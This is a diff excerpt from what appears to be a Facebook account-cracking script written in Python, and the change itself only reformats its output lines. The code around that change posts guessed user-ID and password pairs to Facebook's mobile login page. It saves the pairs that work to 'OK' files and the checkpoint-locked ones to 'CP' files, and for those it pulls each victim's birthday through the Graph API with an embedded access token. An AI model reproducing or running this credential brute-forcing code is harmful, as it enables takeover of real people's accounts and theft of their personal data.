@@ -923,10 +923,10 @@ def manual():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua_mb})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
+					print('\r ID: ' +uid+ '|' + asu + '       ')
 					ok.append(uid+'|'+asu)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
+					save.write(' ID: '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
@@ -936,19 +936,19 @@ def manual():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+__cindy__)
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
-						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
+						print('\r ID: ' +uid+ '|' + asu + '|' + ttl)
 						cp.append(uid+'|'+asu+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
+						save.write(' ID: '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
+					print('\r ID: ' +uid+ '|' + asu + '       ')
 					cp.append(uid+'|'+asu)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
+					save.write(' ID: '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
